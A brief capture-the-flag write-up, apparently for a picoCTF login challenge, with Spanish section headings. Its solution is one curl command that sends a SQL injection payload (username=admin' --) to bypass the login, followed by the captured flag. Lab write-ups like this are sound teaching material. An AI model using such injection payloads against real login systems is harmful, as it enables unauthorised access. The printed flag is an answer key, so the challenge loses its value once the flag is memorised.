### Descripción
Do you think you can log us in? Try to see if you can login!

[http://fickle-tempest.picoctf.net:54757](http://fickle-tempest.picoctf.net:54757/).

### Solución
```
curl -v -X POST -d "username=admin' --" -d "password=a" -d "debug=0" http://fickle-tempest.picoctf.net:54757/.login.php

picoCTF{s0m3_SQL_85832275}
```

### Notas adicionales


### Referencias
https://gemini.google.com/app/8461145b60be50d9?hl=es